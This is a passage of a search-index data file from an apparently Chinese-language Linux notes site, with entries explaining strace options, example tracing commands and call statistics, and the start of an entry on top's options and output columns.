\u8ddf\u8e2a\u7531fork\u8c03\u7528\u6240\u4ea7\u751f\u7684\u5b50\u8fdb\u7a0b. -ff \u5982\u679c\u63d0\u4f9b-o filename,\u5219\u6240\u6709\u8fdb\u7a0b\u7684\u8ddf\u8e2a\u7ed3\u679c\u8f93\u51fa\u5230\u76f8\u5e94\u7684filename.pid\u4e2d,pid\u662f\u5404\u8fdb\u7a0b\u7684\u8fdb\u7a0b\u53f7. \u5e38\u4e0e-o\u9009\u9879\u4e00\u8d77\u4f7f\u7528\uff0c\u4e0d\u540c\u8fdb\u7a0b(\u5b50\u8fdb\u7a0b)\u4ea7\u751f\u7684\u7cfb\u7edf\u8c03\u7528\u8f93\u51fa\u5230filename.PID\u6587 -F \u5c1d\u8bd5\u8ddf\u8e2avfork\u8c03\u7528.\u5728-f\u65f6,vfork\u4e0d\u88ab\u8ddf\u8e2a. -h \u8f93\u51fa\u7b80\u8981\u7684\u5e2e\u52a9\u4fe1\u606f. -i \u8f93\u51fa\u7cfb\u7edf\u8c03\u7528\u7684\u5165\u53e3\u6307\u9488. -q \u7981\u6b62\u8f93\u51fa\u5173\u4e8e\u8131\u79bb\u7684\u6d88\u606f. -r \u6253\u5370\u51fa\u76f8\u5bf9\u65f6\u95f4\u5173\u4e8e,\u6bcf\u4e00\u4e2a\u7cfb\u7edf\u8c03\u7528. -t \u5728\u8f93\u51fa\u4e2d\u7684\u6bcf\u4e00\u884c\u524d\u52a0\u4e0a\u65f6\u95f4\u4fe1\u606f. -tt \u5728\u8f93\u51fa\u4e2d\u7684\u6bcf\u4e00\u884c\u524d\u52a0\u4e0a\u65f6\u95f4\u4fe1\u606f,\u5fae\u79d2\u7ea7. -ttt \u5fae\u79d2\u7ea7\u8f93\u51fa,\u4ee5\u79d2\u4e86\u8868\u793a\u65f6\u95f4. -T \u663e\u793a\u6bcf\u4e00\u8c03\u7528\u6240\u8017\u7684\u65f6\u95f4. -v \u8f93\u51fa\u6240\u6709\u7684\u7cfb\u7edf\u8c03\u7528.\u4e00\u4e9b\u8c03\u7528\u5173\u4e8e\u73af\u5883\u53d8\u91cf,\u72b6\u6001,\u8f93\u5165\u8f93\u51fa\u7b49\u8c03\u7528\u7531\u4e8e\u4f7f\u7528\u9891\u7e41,\u9ed8\u8ba4\u4e0d\u8f93\u51fa. -V \u8f93\u51fastrace\u7684\u7248\u672c\u4fe1\u606f. -x \u4ee5\u5341\u516d\u8fdb\u5236\u5f62\u5f0f\u8f93\u51fa\u975e\u6807\u51c6\u5b57\u7b26\u4e32 -xx \u6240\u6709\u5b57\u7b26\u4e32\u4ee5\u5341\u516d\u8fdb\u5236\u5f62\u5f0f\u8f93\u51fa. -a column \u8bbe\u7f6e\u8fd4\u56de\u503c\u7684\u8f93\u51fa\u4f4d\u7f6e.\u9ed8\u8ba4 \u4e3a40. -e expr \u6307\u5b9a\u4e00\u4e2a\u8868\u8fbe\u5f0f,\u7528\u6765\u63a7\u5236\u5982\u4f55\u8ddf\u8e2a.\u683c\u5f0f\u5982\u4e0b: [qualifier=][!]value1[,value2]... qualifier\u53ea\u80fd\u662f trace,abbrev,verbose,raw,signal,read,write\u5176\u4e2d\u4e4b\u4e00.value\u662f\u7528\u6765\u9650\u5b9a\u7684\u7b26\u53f7\u6216\u6570\u5b57.\u9ed8\u8ba4\u7684 qualifier\u662f trace.\u611f\u53f9\u53f7\u662f\u5426\u5b9a\u7b26\u53f7.\u4f8b\u5982: -eopen\u7b49\u4ef7\u4e8e -e trace=open,\u8868\u793a\u53ea\u8ddf\u8e2aopen\u8c03\u7528.\u800c-etrace!=open\u8868\u793a\u8ddf\u8e2a\u9664\u4e86open\u4ee5\u5916\u7684\u5176\u4ed6\u8c03\u7528.\u6709\u4e24\u4e2a\u7279\u6b8a\u7684\u7b26\u53f7 all \u548c none. \u6ce8\u610f\u6709\u4e9bshell\u4f7f\u7528!\u6765\u6267\u884c\u5386\u53f2\u8bb0\u5f55\u91cc\u7684\u547d\u4ee4,\u6240\u4ee5\u8981\u4f7f\u7528\\\\. -e trace= \u53ea\u8ddf\u8e2a\u6307\u5b9a\u7684\u7cfb\u7edf \u8c03\u7528.\u4f8b\u5982:-e trace=open,close,rean,write\u8868\u793a\u53ea\u8ddf\u8e2a\u8fd9\u56db\u4e2a\u7cfb\u7edf\u8c03\u7528.\u9ed8\u8ba4\u7684\u4e3aset=all. -e trace=file \u53ea\u8ddf\u8e2a\u6709\u5173\u6587\u4ef6\u64cd\u4f5c\u7684\u7cfb\u7edf\u8c03\u7528. -e trace=process \u53ea\u8ddf\u8e2a\u6709\u5173\u8fdb\u7a0b\u63a7\u5236\u7684\u7cfb\u7edf\u8c03\u7528. -e trace=network \u8ddf\u8e2a\u4e0e\u7f51\u7edc\u6709\u5173\u7684\u6240\u6709\u7cfb\u7edf\u8c03\u7528. -e strace=signal \u8ddf\u8e2a\u6240\u6709\u4e0e\u7cfb\u7edf\u4fe1\u53f7\u6709\u5173\u7684 \u7cfb\u7edf\u8c03\u7528 -e trace=ipc \u8ddf\u8e2a\u6240\u6709\u4e0e\u8fdb\u7a0b\u901a\u8baf\u6709\u5173\u7684\u7cfb\u7edf\u8c03\u7528 -e abbrev= \u8bbe\u5b9a strace\u8f93\u51fa\u7684\u7cfb\u7edf\u8c03\u7528\u7684\u7ed3\u679c\u96c6.-v \u7b49\u4e0e abbrev=none.\u9ed8\u8ba4\u4e3aabbrev=all. -e raw= \u5c06\u6307 \u5b9a\u7684\u7cfb\u7edf\u8c03\u7528\u7684\u53c2\u6570\u4ee5\u5341\u516d\u8fdb\u5236\u663e\u793a. -e signal= \u6307\u5b9a\u8ddf\u8e2a\u7684\u7cfb\u7edf\u4fe1\u53f7.\u9ed8\u8ba4\u4e3aall.\u5982 signal=!SIGIO(\u6216\u8005signal=!io),\u8868\u793a\u4e0d\u8ddf\u8e2aSIGIO\u4fe1\u53f7. -e read= \u8f93\u51fa\u4ece\u6307\u5b9a\u6587\u4ef6\u4e2d\u8bfb\u51fa \u7684\u6570\u636e.\u4f8b\u5982: -e read=, -e write= \u8f93\u51fa\u5199\u5165\u5230\u6307\u5b9a\u6587\u4ef6\u4e2d\u7684\u6570\u636e. -o filename \u5c06strace\u7684\u8f93\u51fa\u5199\u5165\u6587\u4ef6filename -p pid \u8ddf\u8e2a\u6307\u5b9a\u7684\u8fdb\u7a0bpid. -s strsize \u6307\u5b9a\u8f93\u51fa\u7684\u5b57\u7b26\u4e32\u7684\u6700\u5927\u957f\u5ea6.\u9ed8\u8ba4\u4e3a32.\u6587\u4ef6\u540d\u4e00\u76f4\u5168\u90e8\u8f93\u51fa. -u username \u4ee5username \u7684UID\u548cGID\u6267\u884c\u88ab\u8ddf\u8e2a\u7684\u547d\u4ee4 \u901a\u7528\u7684\u5b8c\u6574\u7528\u6cd5\uff1a strace -o output.txt -T -tt -e trace=all -p 28979 \u4e0a\u9762\u7684\u542b\u4e49\u662f\u8ddf\u8e2a28979\u8fdb\u7a0b\u7684\u6240\u6709\u7cfb\u7edf\u8c03\u7528\uff08-e trace=all\uff09\uff0c\u5e76\u7edf\u8ba1\u7cfb\u7edf\u8c03\u7528\u7684\u82b1\u8d39\u65f6\u95f4\uff0c\u4ee5\u53ca\u5f00\u59cb\u65f6\u95f4\uff08\u5e76\u4ee5\u53ef\u89c6\u5316\u7684\u65f6\u5206\u79d2\u683c\u5f0f\u663e\u793a\uff09\uff0c\u6700\u540e\u5c06\u8bb0\u5f55\u7ed3\u679c\u5b58\u5728output.txt\u6587\u4ef6\u91cc\u9762\u3002 \u8bed\u6cd5 strace [ -dffhiqrtttTvxx ] [ -acolumn ] [ -eexpr ] ... [ -ofile ] [-ppid ] ... [ -sstrsize ] [ -uusername ] [ -Evar=val ] ... [ -Evar ]... [ command [ arg ... ] ] strace -c [ -eexpr ] ... [ -Ooverhead ] [ -Ssortby ] [ command [ arg... ] ] strace\u7edf\u8ba1 -c \u7edf\u8ba1\u6bcf\u4e00\u7cfb\u7edf\u8c03\u7528\u7684\u6240\u6267\u884c\u7684\u65f6\u95f4,\u6b21\u6570\u548c\u51fa\u9519\u7684\u6b21\u6570\u7b49. % time\uff1a\u6267\u884c\u8017\u65f6\u5360\u603b\u65f6\u95f4\u767e\u5206\u6bd4 seconds\uff1a\u6267\u884c\u603b\u65f6\u95f4 usecs/call\uff1a\u5355\u4e2a\u547d\u4ee4\u6267\u884c\u65f6\u95f4 calls\uff1a\u8c03\u7528\u6b21\u6570 errors: \u51fa\u9519\u6b21\u6570 syscall: \u7cfb\u7edf\u8c03\u7528 \u6587\u7ae0\uff1a https://www.cnblogs.com/machangwei-8/p/10388883.html https://www.linuxidc.com/Linux/2018-01/150654.htm https://blog.csdn.net/dianfu2892/article/details/101466665","title":"strace\u547d\u4ee4"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/strace/#strace","text":"strace\u6709\u4e24\u79cd\u8fd0\u884c\u6a21\u5f0f","title":"strace\u547d\u4ee4"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/strace/#_1","text":"\u901a\u8fc7\u5b83\u542f\u52a8\u8981\u8ddf\u8e2a\u7684\u8fdb\u7a0b\uff0c\u5728\u539f\u672c\u7684\u547d\u4ee4\u524d\u52a0\u4e0astrace\u5373\u53ef\u3002\u6bd4\u5982\u8981\u8ddf\u8e2a ls -lh /var/log/messages \u8fd9\u4e2a\u547d\u4ee4\u7684\u6267\u884c\uff0c\u53ef\u4ee5\u8fd9\u6837\uff1a strace ls -lh /var/log/messages","title":"\u65b9\u5f0f\u4e00"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/strace/#_2","text":"\u8ddf\u8e2a\u5df2\u7ecf\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\uff0c-p pid \u9009\u9879\u5373\u53ef\uff0c\u6bd4\u5982\uff0c\u6709\u4e2a\u5728\u8fd0\u884c\u7684some_server\u670d\u52a1\uff0c\u67e5\u770bpid\uff0c\u7136\u540e\u8ddf\u8e2a pidof some_server 17553 strace -p 17553 \u6309ctrl + C \u7ed3\u675fstrace\u5373\u53ef strace\u6709\u4e00\u4e9b\u9009\u9879\u53ef\u4ee5\u8c03\u6574\u5176\u884c\u4e3a\uff0c\u6211\u4eec\u8fd9\u91cc\u4ecb\u7ecd\u4e0b\u5176\u4e2d\u51e0\u4e2a\u6bd4\u8f83\u5e38\u7528\u7684\uff0c\u7136\u540e\u901a\u8fc7\u793a\u4f8b\u8bb2\u89e3\u5176\u5b9e\u9645\u5e94\u7528\u6548\u679c\u3002","title":"\u65b9\u5f0f\u4e8c"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/strace/#_3","text":"strace -tt -T -v -f -e trace=file -o /data/log/strace.log -s 1024 -p 23489 \u67e5\u770b\u8fdb\u7a0b\u8c03\u7528\u4e86\u54ea\u4e9b\u6587\u4ef6 -tt \u5728\u6bcf\u884c\u8f93\u51fa\u7684\u524d\u9762\uff0c\u663e\u793a\u6beb\u79d2\u7ea7\u522b\u7684\u65f6\u95f4 -T \u663e\u793a\u6bcf\u6b21\u7cfb\u7edf\u8c03\u7528\u6240\u82b1\u8d39\u7684\u65f6\u95f4 -v \u5bf9\u4e8e\u67d0\u4e9b\u76f8\u5173\u8c03\u7528\uff0c\u628a\u5b8c\u6574\u7684\u73af\u5883\u53d8\u91cf\uff0c\u6587\u4ef6stat\u7ed3\u6784\u7b49\u6253\u51fa\u6765\u3002 -f \u8ddf\u8e2a\u76ee\u6807\u8fdb\u7a0b\uff0c\u4ee5\u53ca\u76ee\u6807\u8fdb\u7a0b\u521b\u5efa\u7684\u6240\u6709\u5b50\u8fdb\u7a0b -e \u63a7\u5236\u8981\u8ddf\u8e2a\u7684\u4e8b\u4ef6\u548c\u8ddf\u8e2a\u884c\u4e3a,\u6bd4\u5982\u6307\u5b9a\u8981\u8ddf\u8e2a\u7684\u7cfb\u7edf\u8c03\u7528\u540d\u79f0 -o \u628astrace\u7684\u8f93\u51fa\u5355\u72ec\u5199\u5230\u6307\u5b9a\u7684\u6587\u4ef6 -s \u5f53\u7cfb\u7edf\u8c03\u7528\u7684\u67d0\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u4e32\u65f6\uff0c\u6700\u591a\u8f93\u51fa\u6307\u5b9a\u957f\u5ea6\u7684\u5185\u5bb9\uff0c\u9ed8\u8ba4\u662f32\u4e2a\u5b57\u8282 -p \u6307\u5b9a\u8981\u8ddf\u8e2a\u7684\u8fdb\u7a0bpid, \u8981\u540c\u65f6\u8ddf\u8e2a\u591a\u4e2apid, \u91cd\u590d\u591a\u6b21-p\u9009\u9879\u5373\u53ef\u3002 \u8ddf\u8e2anginx, \u770b\u5176\u542f\u52a8\u65f6\u90fd\u8bbf\u95ee\u4e86\u54ea\u4e9b\u6587\u4ef6 strace -tt -T -f -e trace=file -o /data/log/strace.log -s 1024 ./nginx \u4e0d\u6307\u5b9a\u8bb0\u5f55\u7c7b\u578b strace -tt -T -f -o /tmp/strace.log -s 1024 -p \u8fdb\u7a0b\u53f7","title":"\u793a\u4f8b\u547d\u4ee4\uff1a"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/strace/#_4","text":"https://man7.org/linux/man-pages/man2/syscalls.2.html","title":"\u7cfb\u7edf\u8c03\u7528\u63a5\u53e3\u67e5\u8be2"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/strace/#strace_1","text":"-c \u7edf\u8ba1\u6bcf\u4e00\u7cfb\u7edf\u8c03\u7528\u7684\u6240\u6267\u884c\u7684\u65f6\u95f4,\u6b21\u6570\u548c\u51fa\u9519\u7684\u6b21\u6570\u7b49. -d \u8f93\u51fastrace\u5173\u4e8e\u6807\u51c6\u9519\u8bef\u7684\u8c03\u8bd5\u4fe1\u606f. -f \u8ddf\u8e2a\u7531fork\u8c03\u7528\u6240\u4ea7\u751f\u7684\u5b50\u8fdb\u7a0b. -ff \u5982\u679c\u63d0\u4f9b-o filename,\u5219\u6240\u6709\u8fdb\u7a0b\u7684\u8ddf\u8e2a\u7ed3\u679c\u8f93\u51fa\u5230\u76f8\u5e94\u7684filename.pid\u4e2d,pid\u662f\u5404\u8fdb\u7a0b\u7684\u8fdb\u7a0b\u53f7. \u5e38\u4e0e-o\u9009\u9879\u4e00\u8d77\u4f7f\u7528\uff0c\u4e0d\u540c\u8fdb\u7a0b(\u5b50\u8fdb\u7a0b)\u4ea7\u751f\u7684\u7cfb\u7edf\u8c03\u7528\u8f93\u51fa\u5230filename.PID\u6587 -F \u5c1d\u8bd5\u8ddf\u8e2avfork\u8c03\u7528.\u5728-f\u65f6,vfork\u4e0d\u88ab\u8ddf\u8e2a. -h \u8f93\u51fa\u7b80\u8981\u7684\u5e2e\u52a9\u4fe1\u606f. -i \u8f93\u51fa\u7cfb\u7edf\u8c03\u7528\u7684\u5165\u53e3\u6307\u9488. -q \u7981\u6b62\u8f93\u51fa\u5173\u4e8e\u8131\u79bb\u7684\u6d88\u606f. -r \u6253\u5370\u51fa\u76f8\u5bf9\u65f6\u95f4\u5173\u4e8e,\u6bcf\u4e00\u4e2a\u7cfb\u7edf\u8c03\u7528. -t \u5728\u8f93\u51fa\u4e2d\u7684\u6bcf\u4e00\u884c\u524d\u52a0\u4e0a\u65f6\u95f4\u4fe1\u606f. -tt \u5728\u8f93\u51fa\u4e2d\u7684\u6bcf\u4e00\u884c\u524d\u52a0\u4e0a\u65f6\u95f4\u4fe1\u606f,\u5fae\u79d2\u7ea7. -ttt \u5fae\u79d2\u7ea7\u8f93\u51fa,\u4ee5\u79d2\u4e86\u8868\u793a\u65f6\u95f4. -T \u663e\u793a\u6bcf\u4e00\u8c03\u7528\u6240\u8017\u7684\u65f6\u95f4. -v \u8f93\u51fa\u6240\u6709\u7684\u7cfb\u7edf\u8c03\u7528.\u4e00\u4e9b\u8c03\u7528\u5173\u4e8e\u73af\u5883\u53d8\u91cf,\u72b6\u6001,\u8f93\u5165\u8f93\u51fa\u7b49\u8c03\u7528\u7531\u4e8e\u4f7f\u7528\u9891\u7e41,\u9ed8\u8ba4\u4e0d\u8f93\u51fa. -V \u8f93\u51fastrace\u7684\u7248\u672c\u4fe1\u606f. -x \u4ee5\u5341\u516d\u8fdb\u5236\u5f62\u5f0f\u8f93\u51fa\u975e\u6807\u51c6\u5b57\u7b26\u4e32 -xx \u6240\u6709\u5b57\u7b26\u4e32\u4ee5\u5341\u516d\u8fdb\u5236\u5f62\u5f0f\u8f93\u51fa. -a column \u8bbe\u7f6e\u8fd4\u56de\u503c\u7684\u8f93\u51fa\u4f4d\u7f6e.\u9ed8\u8ba4 \u4e3a40. -e expr \u6307\u5b9a\u4e00\u4e2a\u8868\u8fbe\u5f0f,\u7528\u6765\u63a7\u5236\u5982\u4f55\u8ddf\u8e2a.\u683c\u5f0f\u5982\u4e0b: [qualifier=][!]value1[,value2]... qualifier\u53ea\u80fd\u662f trace,abbrev,verbose,raw,signal,read,write\u5176\u4e2d\u4e4b\u4e00.value\u662f\u7528\u6765\u9650\u5b9a\u7684\u7b26\u53f7\u6216\u6570\u5b57.\u9ed8\u8ba4\u7684 qualifier\u662f trace.\u611f\u53f9\u53f7\u662f\u5426\u5b9a\u7b26\u53f7.\u4f8b\u5982: -eopen\u7b49\u4ef7\u4e8e -e trace=open,\u8868\u793a\u53ea\u8ddf\u8e2aopen\u8c03\u7528.\u800c-etrace!=open\u8868\u793a\u8ddf\u8e2a\u9664\u4e86open\u4ee5\u5916\u7684\u5176\u4ed6\u8c03\u7528.\u6709\u4e24\u4e2a\u7279\u6b8a\u7684\u7b26\u53f7 all \u548c none. \u6ce8\u610f\u6709\u4e9bshell\u4f7f\u7528!\u6765\u6267\u884c\u5386\u53f2\u8bb0\u5f55\u91cc\u7684\u547d\u4ee4,\u6240\u4ee5\u8981\u4f7f\u7528\\\\. -e trace= \u53ea\u8ddf\u8e2a\u6307\u5b9a\u7684\u7cfb\u7edf \u8c03\u7528.\u4f8b\u5982:-e trace=open,close,rean,write\u8868\u793a\u53ea\u8ddf\u8e2a\u8fd9\u56db\u4e2a\u7cfb\u7edf\u8c03\u7528.\u9ed8\u8ba4\u7684\u4e3aset=all. -e trace=file \u53ea\u8ddf\u8e2a\u6709\u5173\u6587\u4ef6\u64cd\u4f5c\u7684\u7cfb\u7edf\u8c03\u7528. -e trace=process \u53ea\u8ddf\u8e2a\u6709\u5173\u8fdb\u7a0b\u63a7\u5236\u7684\u7cfb\u7edf\u8c03\u7528. -e trace=network \u8ddf\u8e2a\u4e0e\u7f51\u7edc\u6709\u5173\u7684\u6240\u6709\u7cfb\u7edf\u8c03\u7528. -e strace=signal \u8ddf\u8e2a\u6240\u6709\u4e0e\u7cfb\u7edf\u4fe1\u53f7\u6709\u5173\u7684 \u7cfb\u7edf\u8c03\u7528 -e trace=ipc \u8ddf\u8e2a\u6240\u6709\u4e0e\u8fdb\u7a0b\u901a\u8baf\u6709\u5173\u7684\u7cfb\u7edf\u8c03\u7528 -e abbrev= \u8bbe\u5b9a strace\u8f93\u51fa\u7684\u7cfb\u7edf\u8c03\u7528\u7684\u7ed3\u679c\u96c6.-v \u7b49\u4e0e abbrev=none.\u9ed8\u8ba4\u4e3aabbrev=all. -e raw= \u5c06\u6307 \u5b9a\u7684\u7cfb\u7edf\u8c03\u7528\u7684\u53c2\u6570\u4ee5\u5341\u516d\u8fdb\u5236\u663e\u793a. -e signal= \u6307\u5b9a\u8ddf\u8e2a\u7684\u7cfb\u7edf\u4fe1\u53f7.\u9ed8\u8ba4\u4e3aall.\u5982 signal=!SIGIO(\u6216\u8005signal=!io),\u8868\u793a\u4e0d\u8ddf\u8e2aSIGIO\u4fe1\u53f7. -e read= \u8f93\u51fa\u4ece\u6307\u5b9a\u6587\u4ef6\u4e2d\u8bfb\u51fa \u7684\u6570\u636e.\u4f8b\u5982: -e read=, -e write= \u8f93\u51fa\u5199\u5165\u5230\u6307\u5b9a\u6587\u4ef6\u4e2d\u7684\u6570\u636e. -o filename \u5c06strace\u7684\u8f93\u51fa\u5199\u5165\u6587\u4ef6filename -p pid \u8ddf\u8e2a\u6307\u5b9a\u7684\u8fdb\u7a0bpid. -s strsize \u6307\u5b9a\u8f93\u51fa\u7684\u5b57\u7b26\u4e32\u7684\u6700\u5927\u957f\u5ea6.\u9ed8\u8ba4\u4e3a32.\u6587\u4ef6\u540d\u4e00\u76f4\u5168\u90e8\u8f93\u51fa. -u username \u4ee5username \u7684UID\u548cGID\u6267\u884c\u88ab\u8ddf\u8e2a\u7684\u547d\u4ee4 \u901a\u7528\u7684\u5b8c\u6574\u7528\u6cd5\uff1a strace -o output.txt -T -tt -e trace=all -p 28979 \u4e0a\u9762\u7684\u542b\u4e49\u662f\u8ddf\u8e2a28979\u8fdb\u7a0b\u7684\u6240\u6709\u7cfb\u7edf\u8c03\u7528\uff08-e trace=all\uff09\uff0c\u5e76\u7edf\u8ba1\u7cfb\u7edf\u8c03\u7528\u7684\u82b1\u8d39\u65f6\u95f4\uff0c\u4ee5\u53ca\u5f00\u59cb\u65f6\u95f4\uff08\u5e76\u4ee5\u53ef\u89c6\u5316\u7684\u65f6\u5206\u79d2\u683c\u5f0f\u663e\u793a\uff09\uff0c\u6700\u540e\u5c06\u8bb0\u5f55\u7ed3\u679c\u5b58\u5728output.txt\u6587\u4ef6\u91cc\u9762\u3002 \u8bed\u6cd5 strace [ -dffhiqrtttTvxx ] [ -acolumn ] [ -eexpr ] ... [ -ofile ] [-ppid ] ... [ -sstrsize ] [ -uusername ] [ -Evar=val ] ... [ -Evar ]... [ command [ arg ... ] ] strace -c [ -eexpr ] ... [ -Ooverhead ] [ -Ssortby ] [ command [ arg... ] ]","title":"strace\u53c2\u6570"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/strace/#strace_2","text":"-c \u7edf\u8ba1\u6bcf\u4e00\u7cfb\u7edf\u8c03\u7528\u7684\u6240\u6267\u884c\u7684\u65f6\u95f4,\u6b21\u6570\u548c\u51fa\u9519\u7684\u6b21\u6570\u7b49. % time\uff1a\u6267\u884c\u8017\u65f6\u5360\u603b\u65f6\u95f4\u767e\u5206\u6bd4 seconds\uff1a\u6267\u884c\u603b\u65f6\u95f4 usecs/call\uff1a\u5355\u4e2a\u547d\u4ee4\u6267\u884c\u65f6\u95f4 calls\uff1a\u8c03\u7528\u6b21\u6570 errors: \u51fa\u9519\u6b21\u6570 syscall: \u7cfb\u7edf\u8c03\u7528 \u6587\u7ae0\uff1a https://www.cnblogs.com/machangwei-8/p/10388883.html https://www.linuxidc.com/Linux/2018-01/150654.htm https://blog.csdn.net/dianfu2892/article/details/101466665","title":"strace\u7edf\u8ba1"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/top/","text":"top\u547d\u4ee4 \u5e38\u7528\u547d\u4ee4\u9009\u9879 $ top -d 1 \u6307\u5b9a\u5237\u65b0\u5c4f\u5e55\u65f6\u95f4\u95f4\u9694 $ top -d 1 -p 10126 \u67e5\u770b\u6307\u5b9a\u8fdb\u7a0b\u7684\u52a8\u6001\u4fe1\u606f $ top -d 1 -p 10126,1 \u67e5\u770b\u591a\u4e2a\u6307\u5b9a\u8fdb\u7a0b\u7684\u52a8\u6001\u4fe1\u606f $ top -d 1 -u apache \u67e5\u770b\u6307\u5b9a\u7528\u6237\u7684\u8fdb\u7a0b $ top -d 1 -b -n 2 > top.txt \u5c062\u6b21top\u4fe1\u606f\u5199\u5165\u5230\u6587\u4ef6 $ top -o %MEM \u6309\u7167\u5185\u5b58\u6392\u5e8f\uff0c\u4ece\u5927\u5230\u5c0f $ top -H \u663e\u793a\u7ebf\u7a0b \u5e38\u89c1\u6807\u9898\u89e3\u91ca $ top top - 16:23:05 up 68 days, 23:07, 1 user, load average: 0.00, 0.01, 0.05 Tasks: 116 total, 1 running, 115 sleeping, 0 stopped, 0 zombie %Cpu(s): 0.1 us, 0.1 sy, 0.0 ni, 99.8 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st KiB Mem : 8008632 total, 4764280 free, 428308 used, 2816044 buff/cache KiB Swap: 0 total, 0 free, 0 used. 7262552 avail Mem PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 1188 root 20 0 50088 1116 780 S 1.0 0.0 1082:03 rshim 8916 root 20 0 1095744 158952 19256 S 0.7 2.0 819:23.35 YDService 1 root 20 0 43700 4044 2600 S 0.0 0.1 1:08.24 systemd 2 root 20 0 0 0 0 S 0.0 0.0 0:02.46 kthreadd 4 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 kworker/0:0H 6 root 20 0 0 0 0 S 0.0 0.0 0:02.74 ksoftirqd/0 7 root rt 0 0 0 0 S 0.0 0.0 0:00.37 migration/0 8 root 20 0 0 0 0 S 0.0 0.0 0:00.00 rcu_bh 9 root 20 0 0 0 0 S 0.0 0.0 2:37.36 rcu_sched 10 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 lru-add-drain 11 root rt 0 0 0 0 S 0.0 0.0 0:13.19 watchdog/0 12 root rt 0 0 0 0 S 0.0 0.0 0:11.66 watchdog/1 13 root rt 0 0 0 0 S 0.0 0.0 0:00.37 migration/1 14 root 20 0 0 0 0 S 0.0 0.0 0:01.30 ksoftirqd/1 16 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 kworker/1:0H 17 root rt 0 0 0 0 S 0.0 0.0 0:11.60 watchdog/2 18 root rt 0 0 0 0 S 0.0 0.0 0:00.41 migration/2 19 root 20 0 0 0 0 S 0.0 0.0 0:00.54 ksoftirqd/2 21 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 kworker/2:0H 22 root rt 0 0 0 0 S 0.0 0.0 0:11.20 watchdog/3 23 root rt 0 0 0 0 S 0.0 0.0 0:00.36 migration/3 24 root 20 0 0 0 0 S 0.0 0.0 0:00.53 ksoftirqd/3 26 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 kworker/3:0H 28 root 20 0 0 0 0 S 0.0 0.0 0:00.00 kdevtmpfs 29 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 netns 30 root 20 0 0 0 0 S 0.0 0.0 0:01.39 khungtaskd PID\uff1a \u8fdb\u7a0bID USER: \u8fd0\u884c\u8fdb\u7a0b\u7684\u7528\u6237 PR\uff1a\u4efb\u52a1\u7684\u8ba1\u5212\u4f18\u5148\u7ea7 NI\uff1anice\u503c VIRT: \u8fdb\u7a0b\u865a\u62df\u5185\u5b58\u5927\u5c0f RES: \u8fdb\u7a0b\u5e38\u9a7b\u5185\u5b58\u5927\u5c0f\uff0c\u4e0d\u5305\u62ecSwap SHR: \u5171\u4eab\u5185\u5b58\u5927\u5c0f %MEM: \u8fdb\u7a0b\u5360\u7528\u7269\u7406\u5185\u5b58\u5360\u7cfb\u7edf\u603b\u5185\u5b58\u7684\u767e\u5206\u6bd4 TIME+\uff1aCPU\u65f6\u95f4\uff0c\u663e\u793a\u9ad8\u7cbe\u5ea6 COMMAND\uff1a\u8fdb\u7a0b\u540d\u5b57 S\uff1a\u8fdb\u7a0b\u72b6\u6001\u3002\u4e0b\u9762\u8fdb\u7a0b\u72b6\u6001\u5176\u4e2d\u4e4b\u4e00 D = \u4e0d\u53ef\u4e2d\u65ad\u72b6\u6001 R = \u8fd0\u884c\u6216\u8005\u53ef\u8fd0\u884c\u72b6\u6001 S = \u53ef\u4e2d\u65ad\u72b6\u6001\u7761\u7720 T = \u6682\u505c\u6216\u8005 t = \u8ddf\u8e2a\u72b6\u6001 Z = \u50f5\u5c38\u8fdb\u7a0b \u4ea4\u4e92\u547d\u4ee4 $ top \u547d\u4ee4\u8f93\u5165\u540e \u6309f\uff0c\u53ef\u914d\u7f6e\u663e\u793a\u7684\u5217 * PID = Process Id DATA = Data+Stack (KiB) * USER = Effective User Name nMaj = Major Page Faults * PR = Priority nMin = Minor Page Faults * NI = Nice Value nDRT = Dirty Pages Count * VIRT = Virtual Image (KiB) WCHAN = Sleeping in Function * RES = Resident Size (KiB) Flags = Task Flags <sched.h> * SHR = Shared Memory (KiB) CGROUPS = Control Groups * S = Process Status SUPGIDS = Supp Groups IDs * %CPU = CPU Usage SUPGRPS = Supp Groups Names * %MEM = Memory Usage (RES) TGID = Thread Group Id * TIME+ = CPU Time, hundredths ENVIRON = Environment vars * COMMAND = Command Name/Line vMj = Major Faults delta PPID = Parent Process pid vMn = Minor Faults delta UID = Effective User Id USED = Res+Swap Size (KiB) RUID = Real User Id nsIPC = IPC namespace Inode RUSER = Real User Name nsMNT = MNT namespace Inode SUID = Saved User Id nsNET = NET namespace Inode SUSER = Saved User Name nsPID = PID namespace Inode GID = Group Id nsUSER = USER namespace Inode GROUP = Group Name nsUTS = UTS namespace Inode PGRP = Process Group Id TTY = Controlling Tty TPGID = Tty Process Grp Id SID = Session Id nTH = Number of Threads P = Last Used Cpu (SMP) TIME = CPU Time SWAP = Swapped Size (KiB) CODE = Code Size (KiB) M \u6309\u5185\u5b58\u7684\u4f7f\u7528\u6392\u5e8f P \u6309CPU\u4f7f\u7528\u6392\u5e8f N \u4ee5PID\u7684\u5927\u5c0f\u6392\u5e8f R \u5bf9\u6392\u5e8f\u8fdb\u884c\u53cd\u8f6c f \u81ea\u5b9a\u4e49\u663e\u793a\u5b57\u6bb5 1 \u663e\u793a\u6240\u6709CPU\u7684\u8d1f\u8f7d W \u5bf9\u66f4\u6539\u8fdb\u884c\u4fdd\u5b58 z \u66f4\u6539\u4e3b\u9898\u989c\u8272 Z 